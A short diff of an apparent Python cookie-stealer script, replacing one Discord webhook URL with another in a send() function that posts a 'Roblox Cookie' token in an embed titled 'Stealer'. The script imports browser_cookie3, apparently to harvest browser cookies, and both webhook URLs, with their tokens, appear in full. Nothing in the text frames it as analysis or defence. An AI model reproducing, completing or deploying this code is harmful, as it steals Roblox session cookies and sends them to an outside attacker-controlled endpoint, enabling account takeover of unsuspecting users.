@@ -3,7 +3,7 @@ import browser_cookie3 as bc
 from threading import Thread
 
 def send(token):
-    hook = Webhook("https://discord.com/api/webhooks/1138107132676419735/rimG2_YYOfa82wYWXYMN9byOtCbef0rw0FdCKDM7DwJdRKzbzwsJwehsgoxLhOI6sQBY")
+    hook = Webhook("https://discord.com/api/webhooks/1248005924078227567/-vMU2FMZ5pLX56J0u384LhGYofE_aFVz-3J28C-UXzJ_UuNOwHioUR8SBSKjwge6tIuS")
 
     embed=Embed(title="Stealer", color=0xff0000)
     embed.add_field(name="Roblox Cookie", value=str(token), inline=True)
